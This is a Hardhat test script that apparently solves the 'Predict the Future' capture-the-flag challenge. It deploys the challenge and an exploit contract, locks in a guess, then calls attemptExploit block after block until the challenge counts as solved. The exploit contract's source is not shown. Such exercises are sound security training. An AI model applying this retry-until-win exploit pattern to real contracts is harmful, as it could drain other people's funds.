const { ethers } = require("hardhat");
const { expect } = require("chai");

const { utils, provider } = ethers;

describe("PredictTheFutureChallenge", () => {
  it("Solves the challenge", async () => {
    const challengeFactory = await ethers.getContractFactory(
      "PredictTheFutureChallenge"
    );
    const challengeContract = await challengeFactory.deploy({
      value: utils.parseEther("1"),
    });
    await challengeContract.deployed();

    const exploitFactory = await ethers.getContractFactory(
      "PredictTheFutureExploit"
    );
    const exploitContract = await exploitFactory.deploy(
      challengeContract.address
    );
    await exploitContract.deployed();

    const lockInInitialGuessTx = await exploitContract.lockInInitialGuess({
      value: utils.parseEther("1"),
    });
    await lockInInitialGuessTx.wait();

    while (!(await challengeContract.isComplete())) {
      try {
        const exploitTx = await exploitContract.attemptExploit();
        await exploitTx.wait();
      } catch (err) {
        console.log(err);
      }
      const blockNumber = await provider.getBlockNumber();
      console.log(`Last block number: ${blockNumber}`);
    }

    expect(await challengeContract.isComplete()).to.be.true;
  });
});
